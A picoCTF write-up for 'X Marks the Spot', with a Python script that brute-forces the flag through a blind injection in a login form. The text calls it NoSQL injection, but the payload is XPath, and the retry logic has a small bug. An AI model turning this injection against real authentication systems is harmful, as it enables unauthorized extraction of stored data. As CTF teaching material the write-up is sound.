## X Marks the Spot
The following python code uses a blind nosql injection to brute force the website. Essentially we can send the server a part of the flag and it will respond with "yes" or "no".  We can use this to brute force the flag. So the script below send every possible charcter until we get a character right, then it appends a new one to try it again for the next character. This process repeats until the flag is complete.

For example:

	Request: "picoCTF{a"
	Response: "no"

	Request: "picoCTF{b"
	Response: "no"

	Request: "picoCTF{c"
	Response: "yes"

	Request: "picoCTF{ca"
	Response: "no"

	Request: "picoCTF{cb"
	Response: "yes"

If you would like to read on the topic, here are some resources:

[https://owasp.org/www-community/attacks/Blind_XPath_Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection "https://owasp.org/www-community/attacks/Blind_XPath_Injection")  

[https://book.hacktricks.xyz/pentesting-web/xpath-injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection "https://book.hacktricks.xyz/pentesting-web/xpath-injection")

  ```python
 import requests
 
alphabet =  "_abcdefghijklmnopqrstuvwxyz1234567890()ABCDEFGHIJKLMNOPQRSTUVXWYZ{}"
flag =  "picoCTF{"
url =  "http://mercury.picoctf.net:28065/"

req = requests.Session()

while flag[-1]  !=  '}':

	for i in  range(len(alphabet)):

		try:
			res = req.post(url,  data={"name":"bob' and //*[contains(text(),'"+flag+alphabet[i]+"')] or ''='","pass":"admin"},  timeout=1)

			if  ("Login failure"  not  in res.text):

				flag += alphabet[i]

				print("[+] Flag: "  + flag)
				
				break

		except:

			i-=1 
